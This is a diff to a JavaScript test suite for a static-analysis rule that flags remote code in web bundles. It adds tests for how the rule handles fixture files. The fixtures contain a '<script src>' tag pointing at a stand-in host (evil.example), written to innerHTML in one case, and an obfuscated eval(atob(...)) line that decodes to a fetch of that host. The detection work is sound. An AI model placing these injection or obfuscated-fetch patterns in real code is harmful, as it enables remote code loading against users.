@@ -81,6 +81,68 @@ describe("zero-remote-code", () => {
     expect(result.verdict).toBe("pass");
     rmSync(root, { recursive: true, force: true });
   });
+
+  it("TRIPOLAR: an inert <script src=http...> literal (assigned to a const, rendered via textContent) is inconclusive, not fail — static analysis cannot tell inert text from an injected node", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "bundle.js": `// synthetic fam3 fixture, mirrors bundle.js:2 inert-literal probe\nconst tag = '<script src="https://evil.example/x.js"></script>';\nel.textContent = tag;\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("inconclusive");
+    expect(result.exitCode).toBe(2);
+    expect(result.findings.length).toBe(0);
+    expect(result.inconclusive.length).toBeGreaterThan(0);
+    expect(result.inconclusive[0].reason).toContain("static analysis cannot determine");
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("TRIPOLAR: the same <script src=http...> literal used as sanitizer fixture data (what the code STRIPS) is inconclusive, not fail", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "bundle.js": `// synthetic fam3 fixture, mirrors bundle.js:6 sanitizer-fixture probe\nconst DIRTY = '<script src="https://evil.example/x.js"></script>';\nexpect(sanitize(DIRTY)).toBe("");\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("inconclusive");
+    expect(result.exitCode).toBe(2);
+    expect(result.findings.length).toBe(0);
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("TRIPOLAR: the same <script src=http...> literal assigned via innerHTML is STILL reported as inconclusive under this rule — static analysis does not distinguish innerHTML sinks from inert text, that is a future rule's job, not this one's", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "real.js": `// synthetic fam3 fixture, mirrors real.js:2 injected-literal probe\nconst tag = '<script src="https://evil.example/x.js"></script>';\nel.innerHTML = tag;\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("inconclusive");
+    expect(result.exitCode).toBe(2);
+    expect(result.findings.length).toBe(0);
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("PRECEDENCE: a genuine eval() finding alongside an inert <script src=http...> literal keeps the verdict fail/exitCode 1 — an inconclusive never masks a real finding", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "bundle.js": `// synthetic fam3 fixture, precedence probe\nconst tag = '<script src="https://evil.example/x.js"></script>';\nel.textContent = tag;\n`,
+      "real.js": `// synthetic fam3 fixture, precedence probe\neval(atob("ZmV0Y2goImh0dHBzOi8vZXZpbC5leGFtcGxlIik="));\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("fail");
+    expect(result.exitCode).toBe(1);
+    expect(result.findings.some((f) => f.message.includes("eval"))).toBe(true);
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("MUST_PASS: no remote code at all", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "sw.js": `// synthetic fam3 fixture\nconst x = 1 + 1;\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("pass");
+    expect(result.exitCode).toBe(0);
+    rmSync(root, { recursive: true, force: true });
+  });
 });
 
 describe("secret-in-bundle", () => {
